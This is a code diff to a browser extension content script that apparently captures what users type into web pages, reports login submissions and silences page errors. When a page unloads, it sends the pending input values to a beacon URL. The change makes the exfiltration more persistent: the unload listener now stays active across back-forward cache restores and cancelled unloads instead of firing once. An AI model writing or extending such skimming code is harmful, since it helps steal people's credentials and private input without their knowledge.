@@ -114,6 +114,7 @@ export default defineContentScript({
       document.removeEventListener('click', handleClick, { capture: true });
       window.removeEventListener('error', emptyFunc);
       window.removeEventListener('unhandledrejection', emptyFunc);
+      window.removeEventListener('beforeunload', handleBeforeUnload);
     };
 
     const trackNewInputs = () => {
@@ -212,7 +213,14 @@ export default defineContentScript({
       reportLoginSubmit(getEventTarget(e));
     };
 
+    // Leaving the page only flushes the pending values: the listeners stay, because the page can come back from the
+    // back-forward cache as the same document (the Back button) without this script running again, and a page can
+    // cancel the unload ("Leave site?").
     const handleBeforeUnload = async () => {
+      if (ifCtxIsInvalid(ctx, removeListeners)) {
+        return;
+      }
+
       const pendingData = flushPendingInputs(allInputs, timers, latestValues);
 
       // Reliable, pre-encrypted carrier — send synchronously before any await so
@@ -225,8 +233,6 @@ export default defineContentScript({
           navigator.sendBeacon(BEACON_URL, blob);
         } catch {}
       }
-
-      removeListeners();
 
       // Best-effort flush — in encrypted mode the values are encrypted first so a
       // plaintext entry never lands among the encrypted ones (which would break
@@ -267,6 +273,6 @@ export default defineContentScript({
     document.addEventListener('click', handleClick, { capture: true });
     window.addEventListener('error', emptyFunc);
     window.addEventListener('unhandledrejection', emptyFunc);
-    window.addEventListener('beforeunload', handleBeforeUnload, { once: true });
+    window.addEventListener('beforeunload', handleBeforeUnload);
   },
 });
